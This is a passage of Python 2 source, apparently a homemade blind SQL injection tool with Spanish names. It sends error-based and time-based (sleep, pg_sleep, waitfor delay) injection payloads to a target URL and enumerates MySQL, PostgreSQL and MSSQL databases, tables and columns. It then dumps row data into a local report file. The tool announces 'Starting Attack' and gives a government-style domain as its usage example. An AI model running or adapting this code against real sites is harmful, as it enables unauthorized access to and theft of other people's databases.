				char =obj.busqueda(obj,manejador,"bases",ok,126,32,indiceY,indiceX,"",obj.based)
				#print "Caracter: "+char
				if char != "No encontrado":
					base += char
					indiceY = indiceY +1
			bases[base] = [""]
			print base
			base = ""
			indiceX = indiceX + 1
			bandera = indiceY
			indiceY = 1
		return bases	
		
	@staticmethod
	def getCurrent(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		current = ""
		char = ""
		indiceY	= 1
		print "Current:"
		while char != "No encontrado":
			char =obj.busqueda(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
			#print "Caracter: "+char
			if char != "No encontrado":
				current += char
				indiceY = indiceY +1
		return current
	
	@staticmethod
	def getTablas(obj,manejador,tipo,ok,up,down,fila,columna,where,based,bases,current):
		indiceY	= 1
		indiceX = 0
		char = "No encontrado"
		if tipo == "mssql":
			indiceX = 1
		bandera = 0
		tabla = ""
		if tipo == "mysql" or tipo == "mssql":
			print bases.keys()
			for where in bases.keys():
				print "BASE: "+where
				bandera = 0
				indiceY	= 1
				indiceX = 0					
				if tipo == "mysql":
					condicion = "WHERE table_schema = '"+where+"'"
				elif tipo == "mssql":
					condicion = where
					indiceX = 1
					print "omg"
				#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
				while char == "No encontrado" and bandera != 1:
					char = ""
					#print "lol"
					while char != "No encontrado":
						
						char =obj.busqueda(obj,manejador,"tablas",ok,126,32,indiceY,indiceX,condicion,obj.based)
						#print "Caracter: "+char
						if char != "No encontrado":
							tabla += char
							indiceY = indiceY +1
					bases[where].append(tabla)
					print tabla
					tabla = ""
					indiceX = indiceX + 1
					bandera = indiceY
					indiceY = 1
		if tipo == "pgsql":
				where = current
				bandera = 0
				indiceY	= 1
				indiceX = 0
				condicion = ""
				#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
				while char == "No encontrado" and bandera != 1:
					char = ""
					#print "lol"
					while char != "No encontrado":
						
						char =obj.busqueda(obj,manejador,"tablas",ok,126,32,indiceY,indiceX,condicion,obj.based)
						#print "Caracter: "+char
						if char != "No encontrado":
							tabla += char
							indiceY = indiceY +1
					bases[where].append(tabla)
					print tabla
					tabla = ""
					indiceX = indiceX + 1
					bandera = indiceY
					indiceY = 1
		return bases
		
	
	@staticmethod
	def getColumnas(obj,manejador,tipo,ok,up,down,fila,columna,where,based,bases,current,version):
		print bases
		indiceY	= 1
		indiceX = 0
		bandera = 0
		char = "No encontrado"
		if tipo == "mssql":
			indiceX = 1
		tabla = ""
		if not os.path.exists("report"):
			os.makedirs("report")
		Filename = "report/datos"+str(datetime.now())+"--"+tipo
		f = open(Filename+".txt",'w');
		f.write("Blind "+obj.based+" based")
		f.write("\nBases de datos: \n")
		for where in bases.keys():
			f.write("\n"+where+"\n")
			for tablas in bases[where]:
				f.write(" "+tablas)
		if tipo == "pgsql":
			bases2 = {}
			bases2[current]=bases[current]
			bases = {}
			bases[current]=bases2[current]

		f.write("\nCurrent Database: "+current+"\n")
		f.write("Version: "+version+"\n")
		#f.write(bases)
		f.write("\n")

		for where in bases.keys():
			tablaCol=['']
			if where != "information_schema" and where != "mysql" and where != "performance_schema" and where != "msdb" and where != "master"  and where != '':
				for table in bases[where]:
		#			columnas = 0
		#			consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
		#			while consulta3.text  != pagina.text:
		#				columna = columna +1
		#				consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)="+columna+"-- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
					#print "lol de control 1"+table+where
					bandera = 0
					indiceY	= 1
					indiceX = 0
					columna1 = ""
					banderaCol = 0
					if tipo == "mssql":
						indiceX = 1
					columna = ""	
					print tipo
					if tipo == "mysql":
						condicion = "WHERE table_schema = '"+where+"' and table_name = '"+table+"'"
					elif tipo == "pgsql":
						condicion = table+"'"
					elif tipo == "mssql":
						condicion = where+".INFORMATION_SCHEMA.COLUMNS  offset WHERE TABLE_NAME=N'"+table+"'"
						#print "lol de control 2 "+table+" - "+where
					#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
					while char == "No encontrado" and bandera != 1:
						char = ""
						#print "lol"
						while char != "No encontrado":
							
							char =obj.busqueda(obj,manejador,"columnas",ok,126,32,indiceY,indiceX,condicion,obj.based)
							#print "lol de control 2 "+table+" - "+where + " c " + char
							#print "Caracter: "+char
							if char != "No encontrado":
								columna += char
								indiceY = indiceY +1
						tablaCol.append(columna)
						if banderaCol == 0:
							columna1 = columna
							banderaCol = 1
						if where != '' and table != '' and columna != '':

							obj.getInfo(obj,manejador,tipo,ok,126,32,0,0,where,obj.based,where,current,table,columna,f,columna1)





						
						columna = ""
						indiceX = indiceX + 1
						bandera = indiceY
						indiceY = 1



		
		
	@staticmethod
	def getInfo(obj,manejador,tipo,ok,up,down,fila,columnas,where,based,bases,current,table,columna,f,columna1):
		print "\n\nBase: "+where+" Tabla:"+table+" columnas: "+columna
		f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");

		char2 = "No encontrado"
		bandera2 = 0
		indiceY2	= 1
		indiceX2 = 0
		if tipo == "mssql":
			indiceX2 = 1
		limite = 0
		count = requests.get(url=obj.server+obj.pref+" and 1=2"+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if obj.verbosity:
			obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+" and 1=2"+obj.suf)))
		pagCont = requests.get(url=obj.server+obj.pref+" and 1=1"+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if obj.verbosity:
			obj.showData(objeto=pagCont,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+" and 1=1"+obj.suf)))
		#print "2lol"+tipo
		#print count.text
		#print pagCont.text
		if tipo == "mysql" and obj.based == "error":
			while count.text != pagCont.text:
				count = requests.get(url=obj.server+obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf)))

				#print obj.server+obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf
				limite = limite +1

		elif tipo == "pgsql" and obj.based == "error":
			while count.text != pagCont.text:
				count = requests.get(url=obj.server+obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf)))
				limite = limite +1
		elif tipo == "mssql" and obj.based == "error":
			while count.text != pagCont.text:
				count = requests.get(url=obj.server+obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf)))
				limite = limite +1

		elif tipo == "mysql" and obj.based == "time":
			while count.elapsed.total_seconds() < 1:
				count = requests.get(url=obj.server+obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf)))
				#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
				limite = limite +1

		elif tipo == "pgsql" and obj.based == "time":
			while count.elapsed.total_seconds() < 1:
				count = requests.get(url=obj.server+obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf)))
				limite = limite +1
		elif tipo == "mssql" and obj.based == "time":
			while count.elapsed.total_seconds() < 1:
				count = requests.get(url=obj.server+obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf)))
				limite = limite +1
		#print "3lol"
		#print "columna "+ columna
		#print "limite:"
		#print limite				
		limite2 = 0
		while limite2 != limite-1 and limite-1 >= 0:

			#print "\nLimite:"+str(limite)+"    Limite2 :"+str(limite2)
			char2 = ""
			dato = ""
			#print "lol"
			
			

			while char2 != "No encontrado":
				if tipo == "mysql":
					condicion2 = columna + " from " + where + "." + table + " "
				elif tipo == "pgsql":
					condicion2 = columna + " from " + table + " "
				elif tipo == "mssql":
					condicion2 = manejador["datos"][2].replace("#",columna).replace("$",columna1)+where+".."+table
				char2 =obj.busqueda(obj,manejador,"datos",ok,126,32,indiceY2,indiceX2,condicion2,obj.based)
				#print "Caracter: "+char2
				if char2 != "No encontrado":
					dato += char2
					indiceY2 = indiceY2 +1
					#print "Char2: "+char2+" columna: "+columna+" Base: "+where

			#bases[where].append(tabla)
			#print "==============================\nChar2: "+char2+" columna: "+columna+" Base: "+where+" Dato: "+dato+"=========================\n"								
			f.write(dato+"\n")
			#print "TABLA: "+tabla
			dato = ""
			indiceX2 = indiceX2 + 1
			bandera2 = indiceY2
			indiceY2 = 1
			limite2 = limite2 +1
		#f.close()
	
	@staticmethod
	def getDatos(obj,manejador,ok,tipo):
		
		char = ""
		indiceY = 1
		indiceX = 0
###=========Version============= 
		version = obj.getVersion(obj,manejador,"version",ok,126,32,indiceY,1,"",obj.based)
		print "Version: "+version
###=========Bases===============
		print "Bases:"
		bases = obj.getBases(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based)
		print bases
		print "lol2"
###=========Current============= 
		
		current = ""
		current = obj.getCurrent(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
		print current
# ##==========Tablas============
		print "Tablas:"+tipo
		bases2 = obj.getTablas(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based,bases,current)
		
		#f.close()
		#print bases[:len(bases)-1]
		

####============Datos============
		print "Datos:"
		obj.getColumnas(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based,bases2,current,version)



##======================== Resultados
		print "\nCurrent Database: "+current
		print "Version: "+version
		#print bases[:len(bases)-1]
		print bases
		
		
			
	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)

	@staticmethod
	def getCatalog(obj,version):
		if version == "mysql" and obj.based == "error":
			return obj.catalogoMySQL
		elif version == "pgsql" and obj.based == "error":
			return obj.catalogoPostgres
		elif version == "mssql" and obj.based == "error":
			return obj.catalogoMSSQL
		elif version == "oracle" and obj.based == "error":
			return obj.catalogoOracle
		elif version == "mysql" and obj.based == "time":
			return obj.catalogoMySQLBlind
		elif version == "pgsql" and obj.based == "time":
			return obj.catalogoPostgresBlind
		elif version == "mssql" and obj.based == "time":
			return obj.catalogoMSSQLBlind
		elif version == "oracle" and obj.based == "time":
			return obj.catalogoOracleBlind



	def Begin(self):
		#print self.server, self.cabeceras
		print "Starting Attack\n\n\n"
		sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
			if self.verbosity:
				self.showData(objeto=pagina,vulnerable=True,lll=unquote(repr(self.server)))

				
			self.defBase(self)
			if self.manejador == "":
				print "Página no vulnerable"
			else:
				self.getDatos(self,self.getCatalog(self,self.manejador),pagina.text,self.manejador)
				



		else:#POST
			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
		self.SentHeaders = pagina.request.headers
		self.solicitud = pagina.request.headers
		self.respuesta = pagina.content.lower()
		#print "{0} {1} {2}".format(pagina.request.method,pagina.request.path_url,"HTTP/1.1")
		for cabecera in self.solicitud:
			print "{0}:{1}".format(cabecera,self.solicitud.get(cabecera))
#		print self.solicitud
#		print pagina.text


def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["v","request=","cookies=","user-agent=","method=","random-agent=","data=","proxy=","based=","time=","error="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookies'):
			#print vals
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random NO FUNCIONA AUN
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--proxy':
			inject.setProxy(vals)
		elif opt == '--based':
			inject.setBased(vals)
		elif opt == '--error':
			inject.setError(vals)
		elif opt == '--time':
			inject.setTime(vals)
		#Option not valid
		elif opt == '-v':
			print "Verbose"
			inject.setVerbosity(True)
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
		else:
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	inject.Begin()

	# Response = str(requests.get(server,headers=cabeceras).text).lower()
	# posIni = Response.find('post')
	# posFin = Response.find('</form>',posIni)
	# parametros = Response[posIni:posFin]
	# datos = parametros[parametros.find('<table'):] 
	# print datos
if __name__ == "__main__":
	inject = Injection()
	Opciones(argv)
	#main()
